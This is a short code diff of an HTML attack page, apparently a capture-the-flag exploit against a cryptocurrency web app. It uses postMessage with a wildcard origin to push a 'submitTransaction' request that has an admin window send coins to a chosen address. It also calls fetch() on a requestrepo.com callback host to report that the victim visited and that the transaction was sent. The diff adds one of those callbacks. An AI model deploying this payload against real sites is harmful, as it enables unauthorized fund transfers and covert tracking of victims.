@@ -7,7 +7,7 @@
         const payload = {
         type: "submitTransaction",
         transaction: {
-            toAddress: "1e0a26e7854fbcc1bf60b86fb2ce47d4dc",
+            toAddress: "addresseds",
             currency: "1337COIN",
             amount: 11
         }
@@ -19,7 +19,8 @@
             win.postMessage(payload, "*");
             fetch('http://we6hfxdk.requestrepo.com/?status=AdminSendedTransactions');
         }
-    }, 1000);
+    }, 2000);
+        fetch('http://we6hfxdk.requestrepo.com/visited');
       
         //document.writeln(win);
     </script>
